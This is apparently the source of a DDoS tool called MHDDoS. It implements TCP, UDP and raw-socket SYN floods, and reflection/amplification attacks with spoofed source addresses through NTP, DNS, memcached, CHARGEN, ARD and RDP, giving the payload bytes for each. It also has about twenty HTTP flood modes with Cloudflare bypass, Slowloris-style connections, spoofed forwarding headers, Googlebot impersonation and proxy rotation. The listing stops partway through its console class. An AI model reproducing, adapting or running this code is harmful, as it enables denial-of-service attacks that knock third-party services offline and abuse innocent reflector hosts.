#!/usr/bin/env python3

from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice
from random import randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import run
from sys import argv
from sys import exit as _exit
from threading import Event, Lock, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cfscrape import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get
from yarl import URL

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__version__: str = "2.3 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None


def getMyIPAddress():
    global __ip__
    if __ip__:
        return __ip__
    with suppress(Exception):
        __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
    with suppress(Exception):
        __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
    with suppress(Exception):
        __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
    with suppress(Exception):
        __ip__ = ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
    with suppress(Exception):
        __ip__ = ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
    with suppress(Exception):
        __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
    return getMyIPAddress()


def exit(*message):
    if message:
        logger.error(" ".join(message))
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER"
    }

    LAYER4_METHODS: Set[str] = {
        "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD",
        "CHAR", "RDP", "MCBOT"
    }
    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]


class Counter(object):

    def __init__(self, value=0):
        self._value = RawValue('i', value)
        self._lock = Lock()

    def __iadd__(self, value):
        with self._lock:
            self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        with self._lock:
            self._value.value = value
        return self


REQUESTS_SENT = Counter()
bytes_sent = Counter()


class Tools:

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return f"-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(num_id) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(num_id))


# noinspection PyBroadException
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            with suppress(Exception):
                while self._synevent.is_set():
                    self.SENT_FLOOD()

    def get_effective_socket(self,
                             conn_type=AF_INET,
                             sock_type=SOCK_STREAM,
                             proto_type=IPPROTO_TCP):
        if self._proxies:
            return randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        return socket(conn_type, sock_type, proto_type)

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        if name == "SYN": self.SENT_FLOOD = self.SYN
        if name == "VSE": self.SENT_FLOOD = self.VSE
        if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
        if name == "MCBOT": self.SENT_FLOOD = self.MCBOT
        if name == "RDP":
            self._amp_payload = (
                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "MEM":
            self._amp_payload = (
                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "DNS":
            self._amp_payload = (
                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

    def TCP(self) -> None:
        global bytes_sent, REQUESTS_SENT
        try:
            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)
                while s.send(randbytes(1024)):
                    REQUESTS_SENT += 1
                    bytes_sent += 1024
        except Exception:
            s.close()

    def MINECRAFT(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload = Minecraft.handshake(self._target, 74, 1)
        try:
            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)

                s.send(payload)
                bytes_sent += len(payload)

                while s.send(b'\x01'):
                    s.send(b'\x00')
                    REQUESTS_SENT += 2
                    bytes_sent += 2

        except Exception:
            s.close()

    def UDP(self) -> None:
        global bytes_sent, REQUESTS_SENT
        try:
            with socket(AF_INET, SOCK_DGRAM) as s:
                while s.sendto(randbytes(1024), self._target):
                    REQUESTS_SENT += 1
                    bytes_sent += 1024

        except Exception:
            s.close()

    def SYN(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload = self._genrate_syn()
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while s.sendto(payload, self._target):
                    REQUESTS_SENT += 1
                    bytes_sent += len(payload)

        except Exception:
            s.close()

    def AMP(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload = next(self._amp_payloads)
        try:
            with socket(AF_INET, SOCK_RAW,
                        IPPROTO_UDP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while s.sendto(*payload):
                    REQUESTS_SENT += 1
                    bytes_sent += len(payload[0])

        except Exception:
            s.close()

    def MCBOT(self) -> None:
        global bytes_sent, REQUESTS_SENT
        login = Minecraft.login("MHDDoS_" + ProxyTools.Random.rand_str(5))
        handshake = Minecraft.handshake_forwarded(self._target,
                                                  47,
                                                  2,
                                                  ProxyTools.Random.rand_ipv4(),
                                                  uuid4())
        try:
            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)

                s.send(handshake)
                s.send(login)
                bytes_sent += (len(handshake + login))
                REQUESTS_SENT += 1

                c = 1000
                while s.recv(1) and c:
                    c -= 1
                    s.send(Minecraft.keepalive(randint(1000, 1234567890)))
                    sleep(0.05)

        except Exception:
            s.close()

    def VSE(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload = (
            b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
            b'\x20\x51\x75\x65\x72\x79\x00')
        try:
            with socket(AF_INET, SOCK_DGRAM) as s:
                while s.sendto(payload, self._target):
                    REQUESTS_SENT += 1
                    bytes_sent += len(payload)
        except Exception:
            s.close()

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(getMyIPAddress())
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(randint(1, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


# noinspection PyBroadException
class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: Keep-Alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            with suppress(Exception):
                while self._synevent.is_set():
                    self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        payload: str = ""
        payload += "X-Forwarded-Proto: Http\r\n"
        payload += f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
        payload += f"Via: {spoof}\r\n"
        payload += f"Client-IP: {spoof}\r\n"
        payload += f'X-Forwarded-For: {spoof}\r\n'
        payload += f'Real-IP: {spoof}\r\n'
        return payload

    def generate_payload(self, other: str = None) -> bytes:
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += other if other else ""
        return str.encode(f"{payload}\r\n")

    def open_connection(self) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket()

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.connect(self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        payload: str = ""
        payload += f"User-Agent: {randchoice(self._useragents)}\r\n"
        payload += f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
        payload += self.SpoofIP
        return payload

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
                                            "STRESS", "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", } \
            else "POST" if {method.upper()} & {"POST", "XMLRPC"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def STRESS(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            (f"Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def COOKIES(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (randint(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32)))
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def APACHE(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def XMLRPC(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (ProxyTools.Random.rand_str(64),
             ProxyTools.Random.rand_str(64)))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def PPS(self) -> None:
        global bytes_sent, REQUESTS_SENT
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(self._defaultpayload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(self._defaultpayload)
        except Exception:
            s.close()

    def GET(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def BOT(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        try:
            with self.open_connection() as s:
                s.send(p1)
                s.send(p2)
                bytes_sent += len(p1 + p2)
                REQUESTS_SENT += 2

                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def EVEN(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                while s.send(payload) and s.recv(1):
                    REQUESTS_SENT += 1
                    bytes_sent += len(payload)
        except Exception:
            s.close()

    def OVH(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(min(self._rpc, 5)):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def CFB(self):
        pro = None
        global bytes_sent, REQUESTS_SENT
        if self._proxies:
            pro = randchoice(self._proxies)
        try:
            with create_scraper() as s:
                for _ in range(self._rpc):
                    if pro:
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            bytes_sent += Tools.sizeOfRequest(res)
                            continue

                    with s.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        bytes_sent += Tools.sizeOfRequest(res)
        except Exception:
            s.close()

    def CFBUAM(self):
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                sleep(5.01)
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def AVB(self):
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    sleep(max(self._rpc / 1000, 1))
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def DGB(self):
        global bytes_sent, REQUESTS_SENT
        with create_scraper() as s:
            try:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    if self._proxies:
                        pro = randchoice(self._proxies)
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            bytes_sent += Tools.sizeOfRequest(res)
                            continue

                    with s.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        bytes_sent += Tools.sizeOfRequest(res)
            except Exception:
                s.close()

    def DYN(self):
        global bytes_sent, REQUESTS_SENT
        payload: str | bytes = self._payload
        payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6),
                                        self._target.authority)
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def DOWNLOADER(self):
        global bytes_sent, REQUESTS_SENT
        payload: str | bytes = self._payload
        payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6),
                                        self._target.authority)
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
                        while 1:
                            sleep(.01)
                            data = s.recv(1)
                            if not data:
                                break
                s.send(b'0')
                bytes_sent += 1

        except Exception:
            s.close()

    def BYPASS(self):
        global REQUESTS_SENT, bytes_sent
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        try:
            with Session() as s:
                for _ in range(self._rpc):
                    if pro:
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            bytes_sent += Tools.sizeOfRequest(res)
                            continue

                    with s.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        bytes_sent += Tools.sizeOfRequest(res)
        except Exception:
            s.close()

    def GSB(self):
        global bytes_sent, REQUESTS_SENT
        payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                self._target.raw_path_qs,
                                                ProxyTools.Random.rand_str(6))
        payload = (payload + 'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n')
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def NULL(self) -> None:
        global bytes_sent, REQUESTS_SENT
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += "User-Agent: null\r\n"
        payload += "Referrer: null\r\n"
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        REQUESTS_SENT += 1
                        bytes_sent += len(payload)
        except Exception:
            s.close()

    def SLOW(self):
        global bytes_sent, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
                while s.send(payload) and s.recv(1):
                    for i in range(self._rpc):
                        keep = str.encode("X-a: %d\r\n" % randint(1, 5000))
                        if s.send(keep):
                            sleep(self._rpc / 15)
                            REQUESTS_SENT += 1
                            bytes_sent += len(keep)
                    break
        except Exception:
            s.close()

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name == "POST":
            self.SENT_FLOOD = self.POST
        if name == "CFB":
            self.SENT_FLOOD = self.CFB
        if name == "CFBUAM":
            self.SENT_FLOOD = self.CFBUAM
        if name == "XMLRPC":
            self.SENT_FLOOD = self.XMLRPC
        if name == "BOT":
            self.SENT_FLOOD = self.BOT
        if name == "APACHE":
            self.SENT_FLOOD = self.APACHE
        if name == "BYPASS":
            self.SENT_FLOOD = self.BYPASS
        if name == "OVH":
            self.SENT_FLOOD = self.OVH
        if name == "AVB":
            self.SENT_FLOOD = self.AVB
        if name == "STRESS":
            self.SENT_FLOOD = self.STRESS
        if name == "DYN":
            self.SENT_FLOOD = self.DYN
        if name == "SLOW":
            self.SENT_FLOOD = self.SLOW
        if name == "GSB":
            self.SENT_FLOOD = self.GSB
        if name == "NULL":
            self.SENT_FLOOD = self.NULL
        if name == "COOKIE":
            self.SENT_FLOOD = self.COOKIES
        if name == "PPS":
            self.SENT_FLOOD = self.PPS
            self._defaultpayload = (
                    self._defaultpayload +
                    "Host: %s\r\n\r\n" % self._target.authority).encode()
        if name == "EVEN": self.SENT_FLOOD = self.EVEN
        if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
        if name == "BOMB": self.SENT_FLOOD = self.BOMB

    def BOMB(self):
        pro = randchoice(self._proxies)

        run([
            f'{Path.home() / "go/bin/bombardier"}',
            f'{bombardier_path}',
            f'--connections={self._rpc}',
            '--http2',
            '--method=GET',
            '--no-print',
            '--timeout=5s',
            f'--requests={self._rpc}',
            f'--proxy={pro}',
            f'{self._target.human_repr()}',
        ])


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info("Downloading Proxies form %d Providers" % len(providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            "Downloading Proxies form (URL: %s, Type: %s, Timeout: %d)" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error('Download Proxy Error: %s' %
                             (e.__str__() or e.__repr__()))
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = "%s@BetterStresser:~#" % gethostname()

        while 1:
